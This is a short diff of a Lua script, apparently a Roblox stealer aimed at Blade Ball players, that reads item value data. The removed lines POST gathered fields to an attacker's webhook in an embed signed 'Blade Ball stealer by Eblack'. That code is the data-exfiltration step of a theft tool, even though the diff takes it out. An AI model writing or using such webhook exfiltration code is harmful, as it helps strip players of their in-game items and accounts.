@@ -285,29 +285,6 @@ local function SendMessage(list)
         end
     end
 
-    local data = {
-        ["embeds"] = {{
-            ["title"] = "\240\159\148\180 New Blade Ball Execution" ,
-            ["color"] = 65280,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "Blade Ball stealer by Eblack"
-			}
-        }}
-    }
-
-    local body = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    local response = request({
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
-end
-
 local rapDataResult = Replion.Client:GetReplion("ItemRAP")
 local rapData = rapDataResult.Data.Items
 
